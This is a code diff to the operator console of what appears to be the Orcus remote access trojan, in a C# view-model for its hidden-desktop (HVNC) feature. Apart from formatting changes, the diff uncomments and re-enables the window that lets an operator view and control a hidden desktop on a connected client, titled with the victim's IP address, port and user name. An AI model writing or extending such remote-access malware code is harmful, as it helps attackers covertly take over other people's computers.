@@ -3,6 +3,7 @@ using System;
 using System.Windows;
 using Orcus.Administration.Commands.HVNC;
 using Orcus.Administration.Plugins.CommandViewPlugin;
+using Orcus.Administration.Views;
 using Sorzus.Wpf.Toolkit;
 
 namespace Orcus.Administration.ViewModels.CommandViewModels
@@ -36,8 +37,14 @@ namespace Orcus.Administration.ViewModels.CommandViewModels
 
         public RenderEngine RenderEngine
         {
-            get { return _renderEngine; }
-            set { SetProperty(value, ref _renderEngine); }
+            get
+            {
+                return _renderEngine;
+            }
+            set
+            {
+                SetProperty(value, ref _renderEngine);
+            }
         }
 
         public RelayCommand OpenDesktopCommand
@@ -49,9 +56,9 @@ namespace Orcus.Administration.ViewModels.CommandViewModels
                     if (IsRunning)
                         return;
 
-                    var paramters = (object[]) parameter;
-                    var desktopName = (string) paramters[0];
-                    var openExplorer = (bool) paramters[1];
+                    var paramters = (object[])parameter;
+                    var desktopName = (string)paramters[0];
+                    var openExplorer = (bool)paramters[1];
                     HvncCommand.CreateDesktop(desktopName, openExplorer);
                 }));
             }
@@ -77,7 +84,7 @@ namespace Orcus.Administration.ViewModels.CommandViewModels
             {
                 return _openProcessCommand ?? (_openProcessCommand = new RelayCommand(parameter =>
                 {
-                    var processName = (string) parameter;
+                    var processName = (string)parameter;
                     if (processName == null)
                         return;
 
@@ -122,17 +129,16 @@ namespace Orcus.Administration.ViewModels.CommandViewModels
             {
                 if (IsRunning)
                 {
-                  /*  _hvncWindow = new HvncWindow(this)
+                    _hvncWindow = new HvncWindow(this)
                     {
-                        Title =
-                            $"HVNC - {ClientController.Client.IpAddress}:{ClientController.Client.Port} ({ClientController.Client.UserName})"
+                        Title = $"HVNC - {ClientController.Client.IpAddress}:{ClientController.Client.Port} ({ClientController.Client.UserName})"
                     };
                     _hvncWindow.Closed += (s, e) =>
                     {
                         _hvncWindow = null;
                         HvncCommand.CloseDesktop();
                     };
-                    _hvncWindow.Show();*/
+                    _hvncWindow.Show();
                 }
                 else
                 {
